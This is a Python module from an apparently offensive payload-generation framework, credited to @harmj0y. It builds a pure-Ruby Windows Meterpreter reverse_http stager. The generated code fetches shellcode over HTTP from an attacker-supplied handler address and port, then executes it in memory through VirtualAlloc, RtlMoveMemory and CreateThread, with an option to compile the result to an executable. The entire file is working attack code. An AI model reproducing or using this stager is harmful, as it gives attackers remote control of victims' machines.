"""

Custom-written pure ruby meterpreter/reverse_http stager.

TODO: better randomization

Module built by @harmj0y

"""

from modules.common import helpers


class Payload:

    def __init__(self):
        # required options
        self.description = "pure windows/meterpreter/reverse_http stager, no shellcode"
        self.language = "ruby"
        self.extension = "rb"
        self.rating = "Normal"

        # options we require user ineraction for- format is {OPTION : [Value, Description]]}
        self.required_options = {
                                    "COMPILE_TO_EXE" : ["Y", "Compile to an executable"],
                                    "LHOST"          : ["", "IP of the Metasploit handler"],
                                    "LPORT"          : ["80", "Port of the Metasploit handler"]
                                }

    def generate(self):

        payloadCode = "require 'rubygems';require 'win32/api';require 'net/http';include Win32\n"
        payloadCode += "exit if Object.const_defined?(:Ocra)\n"

        payloadCode += "$v = API.new('VirtualAlloc', 'IIII', 'I');$r = API.new('RtlMoveMemory', 'IPI', 'V');$c = API.new('CreateThread', 'IIIIIP', 'I');$w = API.new('WaitForSingleObject', 'II', 'I')\n"

        payloadCode += "def ch()\n"
        #payloadCode += "\tchk = (\"a\"..\"z\").to_a + (\"A\"..\"Z\").to_a + (\"0\"..\"9\").to_a\n"
        #payloadCode += "\t32.times do\n"
        #payloadCode += "\t\turi = chk.sample().join()\n"
        #payloadCode += "\t\tchk.sort_by {rand}.each do |x|\n"
        #payloadCode += "\t\t\treturn(uri + x) if (uri + x).unpack(\"C*\").inject(:+) % 0x100 == 92\n"
        #payloadCode += "\t\tend\n"
        #payloadCode += "\tend\n"
        payloadCode += "\treturn \"WEZf\"\n"
        payloadCode += "end\n"

        payloadCode += "def ij(sc)\n"
        payloadCode += "\tif sc.length > 1000\n"
        payloadCode += "\t\tpt = $v.call(0,(sc.length > 0x1000 ? sc.length : 0x1000), 0x1000, 0x40)\n"
        payloadCode += "\t\tx = $r.call(pt,sc,sc.length)\n"
        payloadCode += "\t\tx = $w.call($c.call(0,0,pt,0,0,0),0xFFFFFFF)\n"
        payloadCode += "\tend\nend\n"

        payloadCode += "uri = URI.encode(\"http://%s:%s/#{ch()}\")\n" % (self.required_options["LHOST"][0], self.required_options["LPORT"][0])
        payloadCode += "uri = URI(uri)\n"
        payloadCode += "ij(Net::HTTP.get(uri))"

        return payloadCode
